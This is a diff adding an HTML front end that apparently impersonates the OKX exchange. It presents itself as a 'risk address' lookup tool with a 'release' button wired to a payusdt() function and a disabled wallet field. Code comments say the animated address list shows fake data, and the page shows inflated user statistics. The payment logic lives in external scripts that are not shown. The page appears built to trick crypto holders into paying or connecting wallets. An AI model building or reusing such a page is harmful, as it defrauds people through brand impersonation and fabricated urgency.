@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="zh-TC">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OKX - tools</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #141414;
+            color: #ffffff;
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .navbar {
+            background-color: #141414;
+        }
+        .navbar-brand, .navbar-nav .nav-link {
+            color: #ffffff;
+        }
+        .navbar-nav .nav-link.active {
+            color: #ff4b2b;
+        }
+        .hero-section {
+            background: linear-gradient(160deg, #000000, #1a1a1a);
+            padding: 80px 0;
+            text-align: center;
+        }
+        .hero-section h1 {
+            font-size: 48px;
+            font-weight: bold;
+        }
+        .hero-section p {
+            font-size: 18px;
+            margin-top: 20px;
+            margin-bottom: 40px;
+            color: #dddddd;
+        }
+        .hero-section .input-group {
+            max-width: 500px;
+            margin: 0 auto;
+            margin-top: 20px;
+        }
+        .form-control[disabled], .form-control[readonly] {
+            background-color: #444444;
+            color: #bbbbbb;
+            opacity: 1;
+        }
+        .hero-section .btn-primary {
+            background-color: #ff4b2b;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .content-wrapper {
+            flex: 1;
+            padding-bottom: 20px;
+        }
+        .address-list {
+            margin-top: 30px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            position: relative;
+            z-index: 1000;
+            min-height: 150px; /* 为手机端预留空间 */
+            max-height: 150px; /* 确保在手机端只显示3个地址 */
+            overflow-y: hidden; /* 超出部分隐藏 */
+        }
+
+
+
+
+        .content-wrapper {
+            flex: 1;
+            padding-bottom: 100px; /* 根据需要调整padding */
+        }
+
+           @media (max-width: 768px) {
+        .address-list {
+            min-height: 150px; /* 保证预留3个虚假数据的位置 */
+            max-height: 150px; /* 限制最多显示3个 */
+            overflow-y: hidden; /* 超出部分隐藏 */
+        }
+        }
+
+
+
+        .address-list-item {
+            background-color: #222222;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 0.5s ease, fadeOut 8s 5s forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+        .address {
+            font-family: 'Courier New', monospace;
+        }
+        .stats-footer-container {
+            background-color: #1f1f1f;
+            padding: 20px 0;
+            text-align: center;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+        }
+        .stats-footer-container .stat-item h2 {
+            font-size: 36px;
+            font-weight: bold;
+            color: #ff4b2b;
+        }
+        .stats-footer-container .stat-item p {
+            font-size: 16px;
+            color: #aaaaaa;
+        }
+        .footer {
+            background-color: #141414;
+            padding: 20px 0;
+            text-align: center;
+            color: #888888;
+            font-size: 14px;
+            width: 100%;
+            /* 移除 position: fixed; 并使用 position: relative; */
+            position: relative;
+            z-index: 100;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- 导航栏 -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">Tools</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item lang-switcher">
+                        <a href="#" onclick="setLanguage('zh-TC')" class="nav-link d-inline">繁體中文</a>
+                    </li>
+                    <li class="nav-item lang-switcher">
+                        <a href="#" onclick="setLanguage('en')" class="nav-link d-inline">English</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <div class="hero-section content-wrapper">
+        <div class="container">
+            <h1 id="main-title">風險查詢</h1>
+            <p id="sub-title">用於查詢與處理OKXWEB3上的風險位址</p>
+            <div class="input-group">
+                <input type="text" class="form-control" id="wallet-input" placeholder="请输入您的钱包地址" disabled>
+                <button class="btn btn-primary" id="submit-button" onclick="payusdt();">解除</button>
+            </div>
+
+            <!-- 地址列表 -->
+            <div class="address-list" id="address-list">
+                <!-- 动态生成的地址会被插入到这里 -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Stats and Footer Container -->
+    <div class="stats-footer-container">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-4 stat-item">
+                    <h2 id="stat-risk-users">40,000+</h2>
+                    <p id="stat-risk-users-text">风险用户</p>
+                </div>
+                <div class="col-md-4 stat-item">
+                    <h2 id="stat-safe-users">5,714+</h2>
+                    <p id="stat-safe-users-text">安全用户</p>
+                </div>
+                <div class="col-md-4 stat-item">
+                    <h2 id="stat-runtime-text">000天 00:00:00</h2>
+                    <p id="stat-runtime">运行时间</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>&copy; 2024 TronWeb. 保留所有權利。</p>
+    </div>
+            <div id="overlay" class="overlay">
+        正在查询...
+    </div>
+    <!-- 多语言支持 -->
+   
+    <script src="index.js"></script>
+    <script src="script.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
